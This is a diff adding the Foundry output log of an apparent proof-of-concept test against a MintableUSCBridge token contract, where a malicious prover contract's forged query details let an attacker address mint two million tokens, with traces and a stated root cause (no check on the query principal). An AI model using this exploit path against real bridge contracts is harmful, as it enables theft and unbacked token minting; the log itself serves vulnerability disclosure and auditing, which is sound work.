@@ -1,0 +1,59 @@
+[⠒] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/poc_MintableUSCBridge_test.sol:MintableUSCBridgePoc
+[PASS] test_unlimitedMint() (gas: 200212)
+Logs:
+  === ATTACK SUCCEEDED ===
+  Attacker balance: 2000000 tokens
+  Total supply:     2000000 tokens
+  Root cause: mintFromQuery accepts any proverContractAddr with no
+              check on queryDetails.principal (unlike UniversalBridgeProxy).
+
+Traces:
+  [200212] MintableUSCBridgePoc::test_unlimitedMint()
+    ├─ [2574] ConcreteUSCBridge::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2315] ConcreteUSCBridge::totalSupply() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [106191] ConcreteUSCBridge::mintFromQuery(MaliciousProver: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x59a3543c94e821cc1b2e204ee91585be93d1d9e754faf2eb097796c9c9f213eb)
+    │   ├─ [8151] MaliciousProver::getQueryDetails(0x59a3543c94e821cc1b2e204ee91585be93d1d9e754faf2eb097796c9c9f213eb) [staticcall]
+    │   │   └─ ← [Return] QueryDetails({ state: 2, query: ChainQuery({ chainId: 0, height: 0, index: 0, layoutSegments: [] }), escrowedAmount: 0, principal: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, estimatedCost: 0, timestamp: 0, resultSegments: [ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0xddf252ad00000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 })] })
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000000 [1e24])
+    │   ├─ emit TokensMinted(token: ConcreteUSCBridge: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000000 [1e24], queryId: 0x59a3543c94e821cc1b2e204ee91585be93d1d9e754faf2eb097796c9c9f213eb)
+    │   └─ ← [Stop]
+    ├─ [574] ConcreteUSCBridge::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [59891] ConcreteUSCBridge::mintFromQuery(MaliciousProver: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x204ea4c89ca2724b36ab11c9250843e54ecbd1b10e1cf726cda5a5e0f0dfe486)
+    │   ├─ [4151] MaliciousProver::getQueryDetails(0x204ea4c89ca2724b36ab11c9250843e54ecbd1b10e1cf726cda5a5e0f0dfe486) [staticcall]
+    │   │   └─ ← [Return] QueryDetails({ state: 2, query: ChainQuery({ chainId: 0, height: 0, index: 0, layoutSegments: [] }), escrowedAmount: 0, principal: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, estimatedCost: 0, timestamp: 0, resultSegments: [ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0xddf252ad00000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e }), ResultSegment({ offset: 0, abiBytes: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ResultSegment({ offset: 0, abiBytes: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 })] })
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000000 [1e24])
+    │   ├─ emit TokensMinted(token: ConcreteUSCBridge: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000000 [1e24], queryId: 0x204ea4c89ca2724b36ab11c9250843e54ecbd1b10e1cf726cda5a5e0f0dfe486)
+    │   └─ ← [Stop]
+    ├─ [574] ConcreteUSCBridge::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2000000000000000000000000 [2e24]
+    ├─ [315] ConcreteUSCBridge::totalSupply() [staticcall]
+    │   └─ ← [Return] 2000000000000000000000000 [2e24]
+    ├─ [0] console::log("=== ATTACK SUCCEEDED ===") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [574] ConcreteUSCBridge::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2000000000000000000000000 [2e24]
+    ├─ [0] console::log("Attacker balance:", 2000000 [2e6], "tokens") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [315] ConcreteUSCBridge::totalSupply() [staticcall]
+    │   └─ ← [Return] 2000000000000000000000000 [2e24]
+    ├─ [0] console::log("Total supply:    ", 2000000 [2e6], "tokens") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Root cause: mintFromQuery accepts any proverContractAddr with no") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("            check on queryDetails.principal (unlike UniversalBridgeProxy).") [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 94.14ms (16.39ms CPU time)
+
+Ran 1 test suite in 253.71ms (94.14ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
